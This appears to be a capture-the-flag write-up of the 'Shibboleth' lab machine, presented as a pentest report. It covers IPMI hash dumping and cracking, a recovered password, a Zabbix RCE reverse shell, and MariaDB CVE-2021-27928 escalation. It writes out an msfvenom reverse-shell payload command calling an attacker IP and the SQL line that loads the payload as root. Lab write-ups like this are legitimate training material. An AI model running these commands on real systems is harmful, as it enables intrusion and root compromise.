# Shibboleth 

## Introduction
This pentest report documents the penetration testing conducted on the target system with the hostname shibboleth.htb. The assessment included various phases, such as scanning, enumeration, vulnerability identification, unauthorized access, privilege escalation, and post-exploitation.

### Host Enumeration

#### Adding Hosts to /etc/hosts
To facilitate the assessment, hosts were added to the `/etc/hosts` file.

![image](https://github.com/fullopsec/Pentests/assets/114147068/1d9cffdd-8ca8-4ea2-a578-a5d80d203a2b)


### Port Scanning

#### Nmap
```bash
nmap -sV  10.10.11.124 -p-
```

The Nmap scan revealed the following open ports:

- Port 80/tcp: HTTP

  ![image](https://github.com/fullopsec/Pentests/assets/114147068/763fb870-f0f9-494c-868a-46b038b9b7d4)


### Web Application Assessment

#### Directory Bruteforcing (Dirb)
```bash
dirb http://shibboleth.htb/
```

Dirb scanning identified the following directories and files:

- `/admin.php`
- `/assets/vendor/php-email-form/validate.js`
- `/forms/contact.php`

#### Web Application Exploration
- The source code contained references to PHP Email Form Validation and a subscribe form.
- The PHP Email Form Validation library appeared to be non-functional.

  ![image](https://github.com/fullopsec/Pentests/assets/114147068/c8df8d3d-0609-4d92-b9c4-becf575975c4)


![image](https://github.com/fullopsec/Pentests/assets/114147068/aa469ffc-dacd-4bd7-9530-ea8b7f184328)


#### Subdomain Enumeration (Wfuzz)
```bash
wfuzz -c -f sub-fighter -w Documents/wordlist/subdomains-top1million-5000.txt -u 'http://shibboleth.htb/' -H "Host: FUZZ.shibboleth.htb" --hw 26
```

Subdomain enumeration using Wfuzz revealed the following subdomains:

- monitor.shibboleth.htb
- monitoring.shibboleth.htb
- zabbix.shibboleth.htb

  ![image](https://github.com/fullopsec/Pentests/assets/114147068/737f62c6-3673-4c3f-b965-d47c80240890)


### UDP Scanning

#### Nmap
```bash
sudo nmap -sU --min-rate 5000 shibboleth.htb
```

The UDP scan identified the following open ports:

- Port 623/udp: asf-rmcp

### IPMI Enumeration

#### Metasploit
```bash
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```

The Metasploit module identified the following IPMI version:

- IPMI 2.0

  ![image](https://github.com/fullopsec/Pentests/assets/114147068/c24fdaf3-3d70-448d-aa1b-a53d34bca455)


#### IPMI Tool
```bash
ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P root user list
```

The IPMI tool was used to list users and their privileges.

![image](https://github.com/fullopsec/Pentests/assets/114147068/fdf9f8fc-db02-4970-822d-0fb77f37e5a5)


### IPMI  Remote Password Hash Retrieval

![image](https://github.com/fullopsec/Pentests/assets/114147068/016a36a0-b6a5-4b35-8bc6-51e812fd5a0a)

`[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:ede0b5bd8202000006f3c94897c3b66bf209ebcc7f44c7a8ac46ac5bfd55bc658e2cff204fbdd8d4a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9007cfa9c6d3d917010db4e5bbb0d7c21d9a14ac`

### IPMI Password Reset

#### IPMI Tool
```bash
ipmitool -I lanplus -H 10.10.11.124 -U Administrator -L USER -P abc123
```

![image](https://github.com/fullopsec/Pentests/assets/114147068/208cfc38-77e1-49a8-bf03-4c37e506746d)

![image](https://github.com/fullopsec/Pentests/assets/114147068/f23ef1ce-1730-47e7-85ed-b639e46406b7)


The IPMI tool was used to reset the password for the user "Administrator."

### Vulnerability Exploitation


#### Cracking password


![image](https://github.com/fullopsec/Pentests/assets/114147068/c2f397cc-75c1-45cd-ac93-510bc7fe42f2)

![image](https://github.com/fullopsec/Pentests/assets/114147068/52f1a157-1b64-4433-9d7b-50edd315022b)

`hashcat -m 7300 -a 0 hash /usr/share/wordlists/rockyou.txt`

![image](https://github.com/fullopsec/Pentests/assets/114147068/2f8da525-d174-4519-8741-4c4c305e890b)


Password identified : **ilovepumkinpie1**

We can now log in Zabbix

#### Zabbix RCE Exploitation
Exploiting the Zabbix version 5.0.17 vulnerability (CVE-2020-26897) allowed for remote code execution.

- Exploit: [Zabbix 5.0.17 Remote Code Execution](https://packetstormsecurity.com/files/166256/Zabbix-5.0.17-Remote-Code-Execution.html)

A reverse shell was initiated and connected to the attacker's machine.

![image](https://github.com/fullopsec/Pentests/assets/114147068/a2a5603d-1b3a-432a-b84e-ca1eb3e19ddc)


#### Privilege Escalation

##### LinPEAS
LinPEAS was executed to identify potential privilege escalation vectors.

![image](https://github.com/fullopsec/Pentests/assets/114147068/97e05ae8-c927-449d-b15d-242bd578ec93)


#### Backup Script Exploitation
A backup script (`/usr/local/bin/ayelow.sh`) was identified, which was executed as root.

#### Mariadb Exploitation

`mysql --version `

`mysql Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2`

MariaDb version is vulnerable ! : https://github.com/Al1ex/CVE-2021-27928

` msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.58 LPORT=5659 -f elf-so -o CVE-2021-27928.so `

```
mysql -u zabbix -p
SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
```

### Root Access

![image](https://github.com/fullopsec/Pentests/assets/114147068/68069fdc-0e6b-4f60-a9ee-13305b8b7440)



## Conclusion

This concludes the pentest report for the target system with the hostname shibboleth.htb. The assessment involved multiple phases, including port scanning, web application assessment, subdomain enumeration, UDP scanning, IPMI enumeration, vulnerability exploitation, privilege escalation, and root access. The root access was achieved through the exploitation of the MariaDB service.
